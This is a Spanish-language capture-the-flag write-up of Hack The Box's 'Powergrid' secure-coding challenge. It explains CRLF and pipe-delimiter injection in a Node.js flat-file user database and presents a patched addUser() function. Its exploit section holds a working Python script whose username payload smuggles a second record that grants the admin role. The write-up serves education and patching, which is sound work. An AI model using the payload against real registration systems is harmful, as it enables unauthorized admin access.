---
title: "HTB Secure Coding S10 — Powergrid: CRLF / Delimiter Injection"
date: 2026-04-20
description: "Writeup de Powergrid (HTB Secure Coding Season 10). CRLF e inyección de delimitadores en una base de datos flat-file pipe-delimited permite registrar un usuario con rol admin."
excerpt: "CRLF e inyección de delimiter (|) en Flat-File DB permite escalar a admin sin credenciales válidas."
tags: ["HTB", "Secure Coding", "Web", "CRLF", "Delimiter Injection", "Node.js", "Flat-File"]
platform: "HTB"
difficulty: "Easy"
image: "/images/blog/htb-powergrid.png"
---

<div align="center">

![Author](https://img.shields.io/badge/Author-Flippermen-purple?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge)
![Season](https://img.shields.io/badge/Season-10-orange?style=for-the-badge)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Web-blue?style=for-the-badge)

**Flippermen | CyberFlippers | UDLA-Cyber**

</div>

> **Disclaimer:** Writeup realizado en entorno autorizado de Hack The Box con fines educativos. Enfoque *Secure Coding* — identificar, explotar y parchear vulnerabilidades en código fuente.

---

| Campo | Valor |
|-------|-------|
| Challenge | Powergrid |
| Dificultad | Easy |
| Categoría | Web |
| Puntos | 20 |
| Vulnerabilidad | CRLF / Delimiter Injection en Flat-File DB |
| Stack | Node.js / Express |

## Descripción

La aplicación almacena usuarios en `users.txt` con formato pipe-delimited:

```
username|sha256_hash|role
```

## Vulnerabilidad

`addUser()` en `utils/db.js` no sanitiza el `username` antes de escribirlo al archivo. Un atacante puede inyectar `|` para controlar los campos y `\n` para crear una segunda línea, registrando efectivamente un usuario `admin` con credenciales conocidas.

```javascript
// VULNERABLE — utils/db.js
export function addUser(username, password, role = 'operator') {
    const users = readUsers();
    // No hay sanitización del username
    const newUser = { username, password: hashPassword(password), role };
    users.push(newUser);
    return writeUsers(users);
}
```

## Exploit

```python
import hashlib, requests

TARGET = "http://<IP>:<PORT>"
USER   = "pwned"
PASS   = "CoolPassword17!"

h = hashlib.sha256(PASS.encode()).hexdigest()
payload_user = f"{USER}|{h}|admin\n{USER}"

requests.post(f"{TARGET}/challenge/api/auth/register",
    json={"username": payload_user, "password": PASS})

s = requests.Session()
s.post(f"{TARGET}/challenge/api/auth/login",
    json={"username": USER, "password": PASS})
# → role: admin
```

El `writeUsers()` produce dos líneas en `users.txt`:

```
pwned|4befd7f...|admin
pwned|<hash_real>|operator
```

`readUsers()` lee la primera línea y autentica con `role: admin`.

## Parche

```javascript
// utils/db.js — addUser()
const USERNAME_REGEX = /^[a-zA-Z0-9_\-\.]{3,32}$/;

export function addUser(username, password, role = 'operator') {
    if (!['admin', 'operator'].includes(role)) return false;
    if (typeof username !== 'string') return false;

    // Blacklist explícita de caracteres de control
    if (/[|\n\r\0\t]/.test(username)) return false;

    // Whitelist estricta
    if (!USERNAME_REGEX.test(username)) return false;

    if (typeof password !== 'string' || password.length < 8) return false;

    const users = readUsers();
    if (users.find(u => u.username === username)) return false;

    users.push({ username, password: hashPassword(password), role });
    return writeUsers(users);
}
```

**Defensa en capas:** blacklist de chars de control primero, luego whitelist con regex. Los anchors `^` y `$` aseguran que el match cubra el string completo — sin flags multiline.

## Key Takeaways

1. **Whitelist > Blacklist** — `^[a-zA-Z0-9_]{3,32}$` es más robusta que intentar enumerar chars prohibidos.
2. **Validar el tipo antes del contenido** — `typeof username !== 'string'` evita que objetos maliciosos pasen la regex.
3. **Flat-file DBs son vectores de inyección** — cualquier char que actúe como delimitador o newline en el formato de almacenamiento es un vector potencial.

---

<div align="center">

**Flippermen**
*HackTheBox Season 10 — Platinum Tier | #1 Ecuador | CyberFlippers | UDLA-Cyber*

</div>
